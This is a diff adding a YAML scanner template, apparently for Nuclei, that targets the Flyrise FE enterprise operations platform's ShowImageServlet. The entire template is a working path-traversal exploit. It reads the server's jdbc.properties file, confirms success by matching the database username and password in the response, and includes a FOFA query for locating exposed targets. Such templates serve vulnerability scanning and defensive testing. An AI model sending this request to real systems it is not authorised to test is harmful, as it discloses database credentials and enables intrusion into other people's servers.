@@ -1,0 +1,31 @@
+id: flyrise-ShowImageServlet-traversal-0
+
+info:
+  name: 飞企互联 FE 企业运营管理平台 - traversal
+  author: leadlife
+  severity: high
+  description: todo
+  reference:
+    - https://github.com/zan8in/afrog/blob/c3a0f8662adc69f115637c506f94147a31586131/pocs/afrog-pocs/vulnerability/feiqi-fe-showimageservlet-fileread.yaml#L20
+  metadata:
+    verified: true
+    fofa-qeury: app="飞企互联-FE企业运营管理平台"
+  tags: flyrise,lfi,traversal
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "jdbc.user"
+          - "jdbc.password"
+        condition: and
+
+      - type: status
+        status:
+          - 200
